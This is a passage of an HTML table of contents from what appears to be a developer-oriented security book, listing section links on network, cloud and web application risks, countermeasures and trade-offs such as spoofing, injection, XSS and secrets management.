              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources'>Wrongfully Trusting the Loading of Untrusted Web Resources</a>
            <ul>
              <li>
                <a href='chap04.html#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp'>Content Security Policy (CSP)</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri'>Sub-resource Integrity (SRI)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-countermeasures-tls-downgrade'>TLS Downgrade</a>
            <ul>
              <li>
                <a href='chap04.html#network-countermeasures-tls-downgrade-hsts'>HTTP Strict Transport Security (HSTS)</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-tls-downgrade-hsts-preload'>HTTP Strict Transport Security (HSTS) Preload</a>
              </li>
              <li>
                <a href='chap04.html#network-countermeasures-tls-downgrade-x509-cert-revocation-evolution'>X.509 Certificate Revocation Evolution</a>
                <ul>
                  <li>
                    <a href='chap04.html#leanpub-auto-initiative-1-certification-revocation-list-crl'>Initiative 1: Certification Revocation List (CRL)</a>
                  </li>
                  <li>
                    <a href='chap04.html#network-countermeasures-tls-downgrade-certificate-revocation-evolution-ocsp'>Initiative 2: Online Certificate Status Protocol (OCSP)</a>
                  </li>
                  <li>
                    <a href='chap04.html#leanpub-auto-one-of-the-big-problems'>One of the Big Problems</a>
                  </li>
                  <li>
                    <a href='chap04.html#leanpub-auto-initiative-3-welcome-to-ocsp-staplinghttpenwikipediaorgwikiocspstapling'>Initiative 3: Welcome to OCSP Stapling</a>
                  </li>
                  <li>
                    <a href='chap04.html#leanpub-auto-ocsp-stapling-problem'>OCSP Stapling Problem</a>
                  </li>
                  <li>
                    <a href='chap04.html#network-countermeasures-tls-downgrade-certificate-revocation-evolution-fix-to-ocsp'>Initiative 4: Fix to the OCSP Stapling Problem</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap04.html#network-risks-that-solution-causes'>4. SSM Risks that Solution Causes</a>
        <ul>
          <li>
            <a href='chap04.html#leanpub-auto-fortress-mentality'>Fortress Mentality</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-segmentation'>Lack of Segmentation</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-visibility-4'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-insufficient-logging-1'>Insufficient Logging</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-lack-of-network-intrusion-detection-systems-nids-1'>Lack of Network Intrusion Detection Systems (NIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-spoofing'>Spoofing</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-ip'>IP</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-arp-address-resolution-protocol'>ARP (Address Resolution Protocol)</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-dns'>DNS</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-referrer'>Referrer</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-data-exfiltration-infiltration-1'>Data Exfiltration, Infiltration</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-dropbox-1'>Dropbox</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-physical-2'>Physical</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-mobile-phone-data-2'>Mobile Phone Data</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-dns-ssh-2'>DNS, SSH</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-doppelganger-domains'>Doppelganger Domains</a>
          </li>
          <li>
            <a href='chap04.html#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources'>Wrongfully Trusting the Loading of Untrusted Web Resources</a>
            <ul>
              <li>
                <a href='chap04.html#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-csp'>Content Security Policy (CSP)</a>
              </li>
              <li>
                <a href='chap04.html#network-risks-that-solution-causes-wrongfully-trusting-the-loading-of-untrusted-web-resources-sri'>Sub-resource Integrity (SRI)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#network-risks-that-solution-causes-tls-downgrade'>TLS Downgrade</a>
            <ul>
              <li>
                <a href='chap04.html#network-risks-that-solution-causes-tls-downgrade-hsts'>HTTP Strict Transport Security (HSTS)</a>
              </li>
              <li>
                <a href='chap04.html#network-risks-that-solution-causes-tls-downgrade-hsts-preload'>HTTP Strict Transport Security (HSTS) Preload</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap04.html#network-costs-and-trade-offs'>5. SSM Costs and Trade-offs</a>
        <ul>
          <li>
            <a href='chap04.html#leanpub-auto-fortress-mentality-1'>Fortress Mentality</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-segmentation-1'>Lack of Segmentation</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-lack-of-visibility-5'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-insufficient-logging-2'>Insufficient Logging</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-lack-of-network-intrusion-detection-systems-nids-2'>Lack of Network Intrusion Detection Systems (NIDS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-spoofing-1'>Spoofing</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-data-exfiltration-infiltration-2'>Data Exfiltration, Infiltration</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-dropbox-2'>Dropbox</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-physical-3'>Physical</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-mobile-phone-data-3'>Mobile Phone Data</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-dns-ssh-3'>DNS, SSH</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-doppelganger-domains-1'>Doppelganger Domains</a>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-wrongfully-trusting-the-loading-of-untrusted-web-resources'>Wrongfully Trusting the Loading of Untrusted Web Resources</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-content-security-policy-csp'>Content Security Policy (CSP)</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-sub-resource-integrity-sri'>Sub-resource Integrity (SRI)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap04.html#leanpub-auto-tls-downgrade'>TLS Downgrade</a>
            <ul>
              <li>
                <a href='chap04.html#leanpub-auto-http-strict-transport-security-hsts'>HTTP Strict Transport Security (HSTS)</a>
              </li>
              <li>
                <a href='chap04.html#leanpub-auto-http-strict-transport-security-hsts-preload'>HTTP Strict Transport Security (HSTS) Preload</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap05.html#cloud'>9. Cloud</a>
    <ul>
      <li>
        <a href='chap05.html#leanpub-auto-ssm-asset-identification-1'>1. SSM Asset Identification</a>
        <ul>
          <li>
            <a href='chap05.html#leanpub-auto-productivity'>Productivity</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-competitive-advantage'>Competitive Advantage</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-control'>Control</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-data'>Data</a>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap05.html#cloud-identify-risks'>2. SSM Identify Risks</a>
        <ul>
          <li>
            <a href='chap05.html#cloud-identify-risks-shared-responsibility-model'>Shared Responsibility Model</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-csp-responsibility'>CSP Responsibility</a>
              </li>
              <li>
                <a href='chap05.html#cloud-identify-risks-shared-responsibility-model-csp-customer-responsibility'>CSP Customer Responsibility</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-csp-evaluation'>CSP Evaluation</a>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-cloud-service-provider-vs-in-house'>Cloud Service Provider vs In-house</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-skills'>Skills</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-eula'>EULA</a>
              </li>
              <li>
                <a href='chap05.html#cloud-identify-risks-cloud-service-provider-vs-in-house-giving-up-secrets'>Giving up Secrets</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-location-of-data'>Location of Data</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-vendor-lock-in'>Vendor lock-in</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-possible-single-points-of-failure'>Possible Single Points of Failure</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-review-other-chapters'>Review Other Chapters</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-people'>People</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-application-security-1'>Application Security</a>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-network-security'>Network Security</a>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-violations-of-least-privilege'>Violations of Least Privilege</a>
            <ul>
              <li>
                <a href='chap05.html#cloud-identify-risks-violations-of-least-privilege-machine-instance-single-user-root'>Machine Instance Single User Root</a>
              </li>
              <li>
                <a href='chap05.html#cloud-identify-risks-violations-of-least-privilege-csp-account-single-user-root'>CSP Account Single User Root</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-storage-of-secrets'>Storage of Secrets</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-private-key-abuse'>Private Key Abuse</a>
                <ul>
                  <li>
                    <a href='chap05.html#cloud-identify-risks-storage-of-secrets-private-key-abuse-ssh'>SSH</a>
                  </li>
                  <li>
                    <a href='chap05.html#cloud-identify-risks-storage-of-secrets-private-key-abuse-tls'>TLS</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap05.html#cloud-identify-risks-storage-of-secrets-credentials-and-other-secrets'>Credentials and Other Secrets</a>
                <ul>
                  <li>
                    <a href='chap05.html#leanpub-auto-entered-by-people-manually'>Entered by People (manually)</a>
                  </li>
                  <li>
                    <a href='chap05.html#leanpub-auto-entered-by-software-automatically'>Entered by Software (automatically)</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-serverless'>Serverless</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-third-party-services'>Third Party Services</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-perimeterless'>Perimeterless</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-functions'>Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-dos-of-lambda-functions'>DoS of Lambda Functions</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-infrastructure-and-configuration-management'>Infrastructure and Configuration Management</a>
          </li>
          <li>
            <a href='chap05.html#cloud-identify-risks-aws'>AWS</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-password-less-sudo'>Password-less sudo</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap05.html#leanpub-auto-ssm-countermeasures'>3. SSM Countermeasures</a>
        <ul>
          <li>
            <a href='chap05.html#leanpub-auto-shared-responsibility-model'>Shared Responsibility Model</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-csp-responsibility-1'>CSP Responsibility</a>
              </li>
              <li>
                <a href='chap05.html#cloud-countermeasures-shared-responsibility-model-csp-customer-responsibility'>CSP Customer Responsibility</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-csp-evaluation'>CSP Evaluation</a>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-cloud-service-provider-vs-in-house'>Cloud Service Provider vs In-house</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-skills-1'>Skills</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-eula-1'>EULA</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-giving-up-secrets'>Giving up Secrets</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-location-of-data-1'>Location of Data</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-vendor-lock-in-1'>Vendor lock-in</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-possible-single-points-of-failure-1'>Possible Single Points of Failure</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-review-other-chapters'>Review Other Chapters</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-people-1'>People</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-application-security-2'>Application Security</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-network-security'>Network Security</a>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-violations-of-least-privilege'>Violations of Least Privilege</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-machine-instance-single-user-root'>Machine Instance Single User Root</a>
              </li>
              <li>
                <a href='chap05.html#cloud-countermeasures-violations-of-least-privilege-csp-account-single-user-root'>CSP Account Single User Root</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-storage-of-secrets'>Storage of Secrets</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-private-key-abuse-1'>Private Key Abuse</a>
                <ul>
                  <li>
                    <a href='chap05.html#cloud-countermeasures-storage-of-secrets-private-key-abuse-ssh'>SSH</a>
                  </li>
                  <li>
                    <a href='chap05.html#cloud-countermeasures-storage-of-secrets-private-key-abuse-tls'>TLS</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap05.html#cloud-countermeasures-storage-of-secrets-credentials-and-other-secrets'>Credentials and Other Secrets</a>
                <ul>
                  <li>
                    <a href='chap05.html#cloud-countermeasures-storage-of-secrets-credentials-and-other-secrets-entered-by-people-manually'>Entered by People (manually)</a>
                  </li>
                  <li>
                    <a href='chap05.html#cloud-countermeasures-storage-of-secrets-credentials-and-other-secrets-entered-by-software'>Entered by Software (automatically)</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#cloud-countermeasures-serverless'>Serverless</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-third-party-services-1'>Third Party Services</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-perimeterless-1'>Perimeterless</a>
              </li>
              <li>
                <a href='chap05.html#cloud-countermeasures-serverless-functions'>Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-dos-of-lambda-functions-1'>DoS of Lambda Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-centralised-logging-of-aws-lambdahttpshackernooncomcentralised-logging-for-aws-lambda-b765b7ca9152-functions'>Centralised logging of AWS Lambda Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-frameworks'>Frameworks</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-infrastructure-and-configuration-management'>Infrastructure and Configuration Management</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-aws'>AWS</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-password-less-sudo-1'>Password-less sudo</a>
              </li>
              <li>
                <a href='chap05.html#cloud-countermeasures-aws-additional-tooling'>Additional Tooling</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap05.html#leanpub-auto-ssm-risks-that-solution-causes'>4. SSM Risks that Solution Causes</a>
        <ul>
          <li>
            <a href='chap05.html#leanpub-auto-shared-responsibility-model-1'>Shared Responsibility Model</a>
          </li>
          <li>
            <a href='chap05.html#cloud-risks-that-the-solution-causes-csp-evaluation'>CSP Evaluation</a>
          </li>
          <li>
            <a href='chap05.html#cloud-risks-that-the-solution-causes-cloud-service-provider-vs-in-house'>Cloud Service Provider vs In-house</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-people-2'>People</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-application-security-3'>Application Security</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-network-security-1'>Network Security</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-violations-of-least-privilege'>Violations of Least Privilege</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-storage-of-secrets'>Storage of Secrets</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-private-key-abuse-2'>Private Key Abuse</a>
                <ul>
                  <li>
                    <a href='chap05.html#leanpub-auto-ssh-2'>SSH</a>
                  </li>
                  <li>
                    <a href='chap05.html#leanpub-auto-tls'>TLS</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-credentials-and-other-secrets'>Credentials and Other Secrets</a>
                <ul>
                  <li>
                    <a href='chap05.html#leanpub-auto-entered-by-people-manually-1'>Entered by People (manually)</a>
                  </li>
                  <li>
                    <a href='chap05.html#cloud-risks-that-solution-causes-storage-of-secrets-credentials-and-other-secrets-entered-by-software'>Entered by Software (automatically)</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-serverless'>Serverless</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-functions-1'>Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-dos-of-lambda-functions-2'>DoS of Lambda Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-frameworks-1'>Frameworks</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-infrastructure-and-configuration-management-1'>Infrastructure and Configuration Management</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-aws-1'>AWS</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-additional-tooling'>Additional Tooling</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap05.html#leanpub-auto-ssm-costs-and-trade-offs'>5. SSM Costs and Trade-offs</a>
        <ul>
          <li>
            <a href='chap05.html#leanpub-auto-shared-responsibility-model-2'>Shared Responsibility Model</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-csp-evaluation'>CSP Evaluation</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-cloud-service-provider-vs-in-house'>Cloud Service Provider vs In-house</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-people-3'>People</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-application-security-4'>Application Security</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-network-security-2'>Network Security</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-violations-of-least-privilege-1'>Violations of Least Privilege</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-storage-of-secrets-1'>Storage of Secrets</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-private-key-abuse-3'>Private Key Abuse</a>
                <ul>
                  <li>
                    <a href='chap05.html#leanpub-auto-ssh-3'>SSH</a>
                  </li>
                  <li>
                    <a href='chap05.html#leanpub-auto-tls-1'>TLS</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-credentials-and-other-secrets-1'>Credentials and Other Secrets</a>
                <ul>
                  <li>
                    <a href='chap05.html#leanpub-auto-entered-by-people-manually-2'>Entered by People (manually)</a>
                  </li>
                  <li>
                    <a href='chap05.html#leanpub-auto-entered-by-software-automatically-1'>Entered by Software (automatically)</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-serverless-1'>Serverless</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-functions-2'>Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-dos-of-lambda-functions-3'>DoS of Lambda Functions</a>
              </li>
              <li>
                <a href='chap05.html#leanpub-auto-frameworks-2'>Frameworks</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-infrastructure-and-configuration-management-2'>Infrastructure and Configuration Management</a>
          </li>
          <li>
            <a href='chap05.html#leanpub-auto-aws-2'>AWS</a>
            <ul>
              <li>
                <a href='chap05.html#leanpub-auto-additional-tooling-1'>Additional Tooling</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <a href='chap06.html#web-applications'>10. Web Applications</a>
    <ul>
      <li>
        <a href='chap06.html#leanpub-auto-ssm-asset-identification-2'>1. SSM Asset Identification</a>
      </li>
      <li>
        <a href='chap06.html#leanpub-auto-ssm-identify-risks-2'>2. SSM Identify Risks</a>
        <ul>
          <li>
            <a href='chap06.html#leanpub-auto-lack-of-visibility-6'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-insufficient-logging-and-monitoring'>Insufficient Logging and Monitoring</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-identify-risks-lack-of-input-validation-and-sanitisation'>Lack of Input Validation, Filtering and Sanitisation</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-generic'>Generic</a>
                <ul>
                  <li>
                    <a href='chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation'>What is Validation</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-filtering'>What is Filtering</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation'>What is Sanitisation</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-cross-site-scripting'>Cross-Site Scripting (XSS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-csrf'>Cross-Site Request Forgery (CSRF)</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-injection'>Injection</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-identify-risks-sqli'>SQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-nosqli'>NoSQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-command-injection'>Command Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-xml-injection'>XML Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-xslt-injection'>XSLT Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-xpath-injection'>XPath Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-xquery-injection'>XQuery Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-ldap-injection'>LDAP Injection</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-captcha'>Captcha</a>
          </li>
          <li>
            <a href='chap06.html#web-applications-identify-risks-management-of-application-secrets'>Management of Application Secrets</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-identify-risks-management-of-application-secrets-data-store-compromise'>Data-store Compromise</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-identify-risks-management-of-application-secrets-cracking'>Cracking</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-identify-risks-lack-of-authentication-authorisation-session-management'>Lack of Authentication, Authorisation and Session Management</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-what-is-authentication'>What is Authentication</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-what-is-authorisation'>What is Authorisation</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-identify-risks-cryptography-on-the-client'>Cryptography on the Client (AKA Untrusted Crypto)</a>
          </li>
          <li>
            <a href='chap06.html#web-applications-identify-risks-consuming-free-and-open-source'>Consuming Free and Open Source</a>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-insufficient-attack-protection'>Insufficient Attack Protection</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-lack-of-active-automated-prevention'>Lack of Active Automated Prevention</a>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <a href='chap06.html#leanpub-auto-ssm-countermeasures-1'>3. SSM Countermeasures</a>
        <ul>
          <li>
            <a href='chap06.html#web-applications-countermeasures-lack-of-visibility'>Lack of Visibility</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-lack-of-visibility-insufficient-logging'>Insufficient Logging</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-opening-udp-port'>Opening UDP port</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-using-posix'>Using Posix</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-insufficient-monitoring'>Insufficient Monitoring</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-dark-cockpit'>Dark Cockpit</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-visibility-insufficient-Monitoring-statistics-graphing'>Statistics Graphing</a>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation'>Lack of Input Validation, Filtering and Sanitisation</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic'>Generic</a>
                <ul>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-types-of-escaping'>Types of Escaping:</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp'>Example in JavaScript and C#</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-nodejs'>Example in JavaScript and NodeJS</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-other-things-to-think-about'>Other things to think about</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-cross-site-scripting'>Cross-Site Scripting (XSS)</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#leanpub-auto-cross-site-request-forgery-csrf'>Cross-Site Request Forgery (CSRF)</a>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-injection'>Injection</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-sqli'>SQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-nosqli'>NoSQLi</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-command-injection'>Command Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-xml-injection'>XML Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-xslt-injection'>XSLT Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-xpath-injection'>XPath Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-xquery-injection'>XQuery Injection</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-ldap-injection'>LDAP Injection</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-captcha'>Captcha</a>
            <ul>
              <li>
                <a href='chap06.html#leanpub-auto-types'>Types</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-offerings'>Offerings</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-alternative-approaches'>Alternative Approaches</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-still-not-cutting-it'>Still Not Cutting it</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-user-time-expenditure'>User Time Expenditure</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-bot-pot'>Bot Pot</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-testing'>Testing</a>
              </li>
            </ul>
          </li>
          <li>
            <a href='chap06.html#web-applications-countermeasures-management-of-application-secrets'>Management of Application Secrets</a>
            <ul>
              <li>
                <a href='chap06.html#web-applications-countermeasures-management-of-application-secrets-store-configuration'>Store Configuration in Configuration files</a>
                <ul>
                  <li>
                    <a href='chap06.html#leanpub-auto-node-config'>node-config</a>
                  </li>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-management-of-application-secrets-store-configuration-windows'>Windows</a>
                  </li>
                  <li>
                    <a href='chap06.html#leanpub-auto-linux'>Linux</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-management-of-application-secrets-least-privilege'>Least Privilege</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-location'>Location</a>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-data-store-compromise'>Data-store Compromise</a>
                <ul>
                  <li>
                    <a href='chap06.html#web-applications-countermeasures-data-store-compromise-which-kdf-to-use'>Which KDF to use?</a>
                  </li>
                </ul>
              </li>
              <li>
                <a href='chap06.html#web-applications-countermeasures-management-of-application-secrets-caching-of-sensitive-data'>Caching of Sensitive Data</a>
              </li>
              <li>
                <a href='chap06.html#leanpub-auto-cracking'>Cracking</a>
              </li>
            </ul>
          </li>
          <li>
